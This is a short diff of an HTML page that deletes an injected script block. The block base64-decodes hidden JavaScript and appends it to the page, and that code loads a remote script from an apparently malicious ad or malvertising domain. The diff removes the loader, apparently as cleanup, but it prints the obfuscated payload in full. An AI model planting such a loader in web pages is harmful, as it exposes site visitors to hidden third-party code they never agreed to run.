@@ -49,15 +49,6 @@
         document.querySelector('.toast-panel').style.display = 'none';
     });
 </script>
-<script>
-    (function(){
-        var encodedScript1 = "KGZ1bmN0aW9uKGQseixzKXtzLnNyYz0naHR0cHM6Ly9hbHdpbmd1bGxhLmNvbS84OC90YWcubWluLmpzJytkKyciIGRhdGEtem9uZT0iODEzMTkiIGFzeW5jIGRhdGEtY2Zhc3luYz0iZmFsc2UiO3RyeXsoZG9jdW1lbnQuYm9keXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKX1jYXRjaChlKXt9fSkoJ2dsb2FwaG9vLm5ldCcsNzc1NzIwMyxkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSk=";
-        var decodedScript = atob(encodedScript1);
-        var scriptElement = document.createElement('script');
-        scriptElement.innerHTML = decodedScript;
-        document.head.appendChild(scriptElement);
-    })();
-</script>
 </body>
 </html>
 
